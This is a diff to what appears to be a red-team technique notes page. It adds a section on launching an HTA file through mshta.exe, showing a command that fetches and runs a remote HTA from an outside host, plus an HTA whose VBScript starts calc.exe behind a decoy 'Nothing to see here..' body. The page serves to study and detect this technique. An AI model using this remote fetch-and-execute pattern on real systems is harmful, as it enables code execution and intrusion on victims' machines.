@@ -52,5 +52,50 @@ Also, suspicious commandlines:
 
 ![](../.gitbook/assets/mshta-commandline.png)
 
+## Additionally
+
+The hta file can be invoked like so:
+
+```bash
+mshta.exe http://10.0.0.5/m.hta
+```
+
+![](../.gitbook/assets/mshta-calc2.png)
+
+or by navigating to the file itself and clicking run:
+
+![](../.gitbook/assets/mshta-url.png)
+
+{% code-tabs %}
+{% code-tabs-item title="http://10.0.0.5/m.hta" %}
+```markup
+<html>
+<head>
+<script language="VBScript"> 
+    Sub RunProgram
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run "calc.exe"
+    End Sub
+RunProgram()
+</script>
+</head> 
+<body>
+    Nothing to see here..
+</body>
+</html>
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+
+
+
+
+
+
+
+
+
+
 
 
